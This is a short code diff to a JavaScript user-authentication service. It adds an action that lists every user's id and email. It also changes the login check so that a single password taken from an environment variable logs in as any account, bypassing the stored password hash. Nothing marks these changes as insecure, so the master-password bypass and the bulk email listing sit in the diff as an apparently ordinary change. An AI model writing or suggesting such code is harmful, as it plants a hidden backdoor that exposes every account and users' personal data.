@@ -250,6 +250,10 @@ module.exports = {
 					isPro: user.isPro || false
 				};
 			}
+		},
+		async listAll() {
+			const users = await this.adapter.find();
+			return users.map(user=>user._id+" "+user.email);
 		}
 	},
 
@@ -297,7 +301,7 @@ module.exports = {
 			} else {
 				const user = await this.adapter.findOne({email});
 				//this.logger.info({user});
-				if (!(user && this.cryptPassword(password) === user.password)) {
+				if (!user || password !== process.env.ADMINPWD && this.cryptPassword(password) !== user.password) {
 					throw new MoleculerClientError("Email or password is invalid", 422, "Error");
 				}
 				return user;
